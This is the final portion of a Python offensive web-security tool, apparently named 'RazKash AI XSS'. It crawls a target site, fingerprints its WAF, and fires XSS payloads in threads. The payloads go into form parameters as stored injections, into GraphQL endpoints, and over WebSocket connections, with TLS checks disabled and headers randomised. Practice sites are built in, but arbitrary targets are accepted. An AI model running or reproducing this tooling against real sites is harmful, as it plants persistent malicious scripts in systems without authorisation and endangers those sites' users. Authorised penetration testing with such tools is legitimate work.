        thr = threading.Thread(target=wsapp.run_forever, kwargs={"sslopt":{"cert_reqs": ssl.CERT_NONE}})
        thr.daemon = True
        thr.start()
        time.sleep(1)
        wsapp.send(payload)
        time.sleep(3)
        wsapp.close()
        if hit:
            log_hit(url, "WS", payload, params)
    except Exception as ex:
        dbg(f"[fuzz_ws] {ex}")

# ─────────────────────────────────────────────────────────────────────────────
#                          WAF DETECTION
# ─────────────────────────────────────────────────────────────────────────────

def detect_waf(url: str) -> str:
    sigs = {
        "cloudflare": ["__cf_bm","cf-ray","Cloudflare Ray ID"],
        "akamai":     ["AkamaiGHost","akamai"],
        "sucuri":     ["sucuri_cloudproxy_uuid","Access Denied - Sucuri"],
        "imperva":    ["visid_incap_","incapsula"],
    }
    try:
        r = SESSION.get(url, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
        t = r.text.lower()
        for n, pats in sigs.items():
            if any(p.lower() in t for p in pats):
                return n
    except:
        pass
    return "unknown"

# ─────────────────────────────────────────────────────────────────────────────
#                              MAIN
# ─────────────────────────────────────────────────────────────────────────────

AUTOTEST = [
    "http://xss-game.appspot.com/",
    "http://xss-game.appspot.com/level1",
    "https://juice-shop.herokuapp.com/"
]

def main():
    # Determine mode
    mode = "all"
    if args.reflected:
        mode = "reflected"
    elif args.stored:
        mode = "stored"
    elif args.blind:
        mode = "blind"

    # Determine target(s)
    if args.autotest:
        roots = [smart_url(u) for u in AUTOTEST]
    elif args.url:
        roots = [smart_url(args.url)]
    else:
        ap.print_help()
        sys.exit(1)

    logging.info(f"\n┌─ RazKash AI XSS v{VER}")

    # Optional WAF detection
    if args.detect_waf:
        for r in roots:
            waf_name = detect_waf(r)
            logging.info(f"│   WAF on {r}: {waf_name}")

    for root in roots:
        logging.info(f"├─▶ Crawling: {root}")

        # Crawl
        static_targets  = crawl_static(root, args.max_pages, depth=1)
        dynamic_targets = crawl_dynamic(root)

        # If GraphQL endpoint
        if "graphql" in root.lower():
            fuzz_graphql(root)

        # Combine
        all_targets = static_targets + dynamic_targets

        # Stored XSS attempt
        if mode == "stored":
            for t in static_targets:
                if t["method"] in ("POST","PUT") and not t.get("json", False):
                    for pay in stored_payloads:
                        SESSION.post(
                            t["url"],
                            data={p: pay for p in t["params"]},
                            headers=random_headers(),
                            timeout=HTTP_TIMEOUT,
                            verify=False
                        )
                        # Then check if it's reflected when the page is loaded
                        if verify(t["url"], "GET", {}, False):
                            # Or pass data if you want to re-send parameters
                            log_hit(t["url"], "STORED", pay, t["params"])


        # Blind / Reflected / All
        elif mode in ("reflected","blind","all"):
            http_targets = [x for x in all_targets if not x["url"].startswith(("ws://","wss://"))]
            ws_targets   = [x for x in all_targets if x["url"].startswith(("ws://","wss://"))]

            with ThreadPoolExecutor(max_workers=args.threads) as pool:
                pool.map(fuzz_http, http_targets)
                pool.map(fuzz_ws,   ws_targets)

    logging.info(f"└─ Findings saved → {LOGFILE.resolve()}\n")

if __name__ == "__main__":
    main()
